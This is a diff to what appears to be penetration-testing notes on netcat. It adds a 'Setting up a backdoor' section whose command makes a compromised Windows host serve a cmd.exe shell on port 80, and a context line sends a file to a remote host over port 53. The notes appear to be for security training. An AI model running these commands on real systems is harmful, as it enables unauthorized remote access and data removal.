@@ -38,8 +38,11 @@ on the local host:
 `# nc [remote host] 53 < toolkit.zip`
 
 ### Setting up a backdoor
+You have compromised a Windows host and you wish to establish a backdoor that you will be able to connect to from your BackTrack attack machine.
+on the compromised windows host:
+`# nc -l -p 80 -d -e cmd.exe -L`
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxMDUyMjU5NjAsNTc4NTkzODQyLDExOT
-kyNTM5NzAsOTQ2MDIyMzIzLDEzNzI5ODYyMDBdfQ==
+eyJoaXN0b3J5IjpbLTg1MjM3NzE0MCw1Nzg1OTM4NDIsMTE5OT
+I1Mzk3MCw5NDYwMjIzMjMsMTM3Mjk4NjIwMF19
 -->
